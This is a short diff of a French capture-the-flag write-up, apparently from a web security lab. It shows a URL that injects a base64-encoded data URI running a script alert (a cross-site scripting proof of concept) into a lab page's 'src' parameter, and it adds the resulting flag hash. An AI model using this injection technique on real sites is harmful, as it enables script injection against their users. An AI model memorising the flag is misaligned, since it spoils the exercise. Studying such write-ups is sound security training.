@@ -22,8 +22,6 @@ On choisit donc d'encoder en base 64 et donc d'utiliser l'argument base64 dans l
 http://10.14.200.61/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
 
 
+En accedant a cette page on obtient le flag suivant :
 
-
-
-
-
+928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
